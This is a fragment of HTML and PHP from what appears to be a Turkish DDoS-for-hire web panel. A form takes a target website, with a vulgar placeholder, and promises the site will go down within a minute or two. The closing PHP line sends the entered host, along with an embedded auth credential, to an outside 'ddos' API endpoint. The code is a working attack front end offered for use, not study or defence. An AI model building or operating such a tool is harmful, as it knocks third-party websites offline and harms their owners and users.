                                ...
                                <div class="card-body">
                                    <div class="row">
                                        <section id="floating-label-input">
											...
											İşlemi başlattıktan sonra lütfen bekleyiniz. Site 1-2 dakika içinde düşmektedir :)
											</div>
                                                <div class="col-sm-6 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
											
                                                        <div class="mb-1">
                                                            <label class="form-label" for="basicInput">SİTE :</label>
                                                            <input type="text" class="form-control" name="no" placeholder="Sikilecek siteyi giriniz Format: (https://anansikim.com.tr/)" />
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
...
$filename = "https://ajexnetwork.com.tr/api/ddos?auth=fonnynewapi@3145@&host=$no";
